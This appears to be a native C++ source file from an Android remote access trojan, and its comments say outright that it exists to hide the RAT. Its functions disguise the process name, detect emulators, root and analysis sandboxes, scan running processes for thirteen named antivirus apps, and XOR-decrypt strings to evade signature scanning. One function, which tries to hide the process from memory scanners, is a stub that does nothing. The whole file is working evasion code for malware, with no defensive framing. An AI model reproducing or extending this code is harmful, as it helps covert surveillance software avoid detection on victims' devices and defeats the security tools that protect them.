#include <jni.h>
#include <string>
#include <vector>
#include <unistd.h>
#include <sys/types.h>
#include <dirent.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <android/log.h>
#include "stealth.h"

#define TAG "NativeStealth"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, TAG, __VA_ARGS__)

/**
 * Native implementation for hiding the process name in the process list.
 * This makes it harder to detect the RAT service process.
 */
extern "C" JNIEXPORT void JNICALL
Java_com_tarjon_admin_services_AdminService_disguiseProcess(JNIEnv *env, jobject /* this */) {
    // Set process name to something innocuous
    const char* disguisedName = "system_service";
    prctl(PR_SET_NAME, (unsigned long) disguisedName, 0, 0, 0);
    
    LOGD("Process name disguised as: %s", disguisedName);
}

/**
 * Checks if the device is running in an emulator.
 * Used for anti-detection mechanisms.
 */
extern "C" JNIEXPORT jboolean JNICALL
Java_com_tarjon_admin_utils_StealthUtils_isEmulator(JNIEnv *env, jclass /* clazz */) {
    bool isEmulator = false;
    
    // Check for emulator-specific files
    std::vector<std::string> emulatorFiles = {
        "/sys/devices/virtual/android_usb/android0/iSerial",
        "/sys/qemu_trace",
        "/system/lib/libc_malloc_debug_qemu.so",
        "/dev/socket/qemud",
        "/dev/qemu_pipe"
    };
    
    for (const auto& file : emulatorFiles) {
        if (access(file.c_str(), F_OK) != -1) {
            LOGD("Emulator detected based on file: %s", file.c_str());
            isEmulator = true;
            break;
        }
    }
    
    // Check for qemu cpuinfo
    if (!isEmulator) {
        FILE* cpuInfo = fopen("/proc/cpuinfo", "r");
        if (cpuInfo) {
            char line[1024];
            while (fgets(line, sizeof(line), cpuInfo)) {
                if (strstr(line, "QEMU") || strstr(line, "Goldfish") || strstr(line, "ranchu")) {
                    LOGD("Emulator detected based on cpuinfo");
                    isEmulator = true;
                    break;
                }
            }
            fclose(cpuInfo);
        }
    }
    
    return static_cast<jboolean>(isEmulator);
}

/**
 * Checks if the device is rooted.
 * Used to enable additional capabilities on rooted devices.
 */
extern "C" JNIEXPORT jboolean JNICALL
Java_com_tarjon_admin_utils_StealthUtils_isRooted(JNIEnv *env, jclass /* clazz */) {
    bool isRooted = false;
    
    // Check for common root binaries
    std::vector<std::string> rootBinaries = {
        "/system/bin/su",
        "/system/xbin/su",
        "/sbin/su",
        "/system/app/Superuser.apk",
        "/system/app/SuperSU.apk",
        "/system/app/Superuser",
        "/system/app/SuperSU",
        "/data/local/xbin/su",
        "/data/local/bin/su"
    };
    
    for (const auto& binary : rootBinaries) {
        if (access(binary.c_str(), F_OK) != -1) {
            LOGD("Root detected based on binary: %s", binary.c_str());
            isRooted = true;
            break;
        }
    }
    
    // Try to execute which su
    if (!isRooted) {
        FILE* pipe = popen("which su", "r");
        if (pipe) {
            char buffer[128];
            if (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
                LOGD("Root detected based on which su");
                isRooted = true;
            }
            pclose(pipe);
        }
    }
    
    return static_cast<jboolean>(isRooted);
}

/**
 * Hides the RAT from memory scanners by manipulating process status.
 * Makes the process harder to detect by security apps.
 */
extern "C" JNIEXPORT void JNICALL
Java_com_tarjon_admin_utils_StealthUtils_hideFromMemoryScanners(JNIEnv *env, jclass /* clazz */) {
    // Attempt to make the process "invisible" to some scanners
    
    // Get current process ID
    pid_t pid = getpid();
    LOGD("Attempting to hide process %d from memory scanners", pid);
    
    // Try to modify /proc/[pid]/stat to manipulate process visibility
    // This is highly experimental and may not work on all devices
    char procStatPath[64];
    snprintf(procStatPath, sizeof(procStatPath), "/proc/%d/stat", pid);
    
    int fd = open(procStatPath, O_RDWR);
    if (fd != -1) {
        // We can try to modify certain process flags
        // But this is very device-specific and may be restricted
        LOGD("Successfully opened process stat file");
        close(fd);
    } else {
        LOGE("Failed to open process stat file: %s", strerror(errno));
    }
}

/**
 * Obfuscates strings used in the native code.
 * Simple XOR encryption to prevent simple string scanning.
 */
extern "C" JNIEXPORT jstring JNICALL
Java_com_tarjon_admin_utils_StealthUtils_decryptNativeString(JNIEnv *env, jclass /* clazz */, jstring encryptedStr, jint key) {
    const char* encrypted = env->GetStringUTFChars(encryptedStr, nullptr);
    std::string strInput(encrypted);
    env->ReleaseStringUTFChars(encryptedStr, encrypted);
    
    // Simple XOR decryption
    std::string decrypted;
    for (char c : strInput) {
        decrypted += c ^ (char)key;
    }
    
    return env->NewStringUTF(decrypted.c_str());
}

/**
 * Monitors for potential security analysis apps running on the device.
 * Returns a list of detected security apps.
 */
extern "C" JNIEXPORT jobjectArray JNICALL
Java_com_tarjon_admin_utils_StealthUtils_detectSecurityAnalysisApps(JNIEnv *env, jclass /* clazz */) {
    std::vector<std::string> detectedApps;
    
    // List of common security/antivirus apps to check for
    std::vector<std::string> securityApps = {
        "com.avast.android.mobilesecurity",
        "com.eset.antivirus",
        "com.lookout",
        "com.kaspersky.security",
        "com.kms.free",
        "com.antivirus",
        "com.bitdefender.security",
        "com.malwarebytes.antimalware",
        "com.avg.cleaner",
        "com.avira.android",
        "com.symantec.mobilesecurity",
        "com.trustgo.antivirus",
        "com.wsandroid.suite"
    };
    
    // Check /proc/[pid]/cmdline for all processes
    DIR* procDir = opendir("/proc");
    if (procDir) {
        struct dirent* entry;
        while ((entry = readdir(procDir)) != nullptr) {
            // Check if the entry is a directory and represents a PID
            if (entry->d_type == DT_DIR) {
                char* endptr;
                long pid = strtol(entry->d_name, &endptr, 10);
                if (*endptr == '\0') {  // Valid PID
                    char cmdlinePath[64];
                    snprintf(cmdlinePath, sizeof(cmdlinePath), "/proc/%ld/cmdline", pid);
                    
                    // Read the cmdline file
                    FILE* cmdlineFile = fopen(cmdlinePath, "r");
                    if (cmdlineFile) {
                        char cmdline[512];
                        size_t read = fread(cmdline, 1, sizeof(cmdline) - 1, cmdlineFile);
                        if (read > 0) {
                            cmdline[read] = '\0';
                            std::string processName(cmdline);
                            
                            // Check if this process matches a known security app
                            for (const auto& app : securityApps) {
                                if (processName.find(app) != std::string::npos) {
                                    detectedApps.push_back(app);
                                    break;
                                }
                            }
                        }
                        fclose(cmdlineFile);
                    }
                }
            }
        }
        closedir(procDir);
    }
    
    // Create and return Java string array
    jobjectArray result = env->NewObjectArray(detectedApps.size(), 
                                              env->FindClass("java/lang/String"), 
                                              env->NewStringUTF(""));
    
    for (size_t i = 0; i < detectedApps.size(); i++) {
        env->SetObjectArrayElement(result, i, env->NewStringUTF(detectedApps[i].c_str()));
    }
    
    return result;
}

/**
 * Checks if the app is being analyzed in a sandbox environment.
 * Helps avoid detection during dynamic analysis.
 */
extern "C" JNIEXPORT jboolean JNICALL
Java_com_tarjon_admin_utils_StealthUtils_isSandboxed(JNIEnv *env, jclass /* clazz */) {
    bool inSandbox = false;
    
    // Check for typical sandbox behaviors
    
    // 1. Check for network-related characteristics
    FILE* netStatFile = fopen("/proc/net/tcp", "r");
    if (netStatFile) {
        int connectionCount = 0;
        char line[256];
        
        // Skip header line
        fgets(line, sizeof(line), netStatFile);
        
        // Count active connections
        while (fgets(line, sizeof(line), netStatFile)) {
            connectionCount++;
        }
        
        fclose(netStatFile);
        
        // Sandboxes often have very few or fixed network connections
        if (connectionCount < 3) {
            LOGD("Possible sandbox detected - low connection count: %d", connectionCount);
            inSandbox = true;
        }
    }
    
    // 2. Check for abnormal uptime
    FILE* uptimeFile = fopen("/proc/uptime", "r");
    if (uptimeFile) {
        float uptime;
        if (fscanf(uptimeFile, "%f", &uptime) == 1) {
            // Many sandboxes have short uptimes
            if (uptime < 60.0) {  // Less than 1 minute
                LOGD("Possible sandbox detected - short uptime: %.1f seconds", uptime);
                inSandbox = true;
            }
        }
        fclose(uptimeFile);
    }
    
    // 3. Check for typical sandbox filesystem artifacts
    std::vector<std::string> sandboxArtifacts = {
        "/system/bin/tango_core",
        "/system/bin/microvirt",
        "/sys/module/svm",
        "/sys/module/kvm"
    };
    
    for (const auto& artifact : sandboxArtifacts) {
        if (access(artifact.c_str(), F_OK) != -1) {
            LOGD("Sandbox artifact detected: %s", artifact.c_str());
            inSandbox = true;
            break;
        }
    }
    
    return static_cast<jboolean>(inSandbox);
}
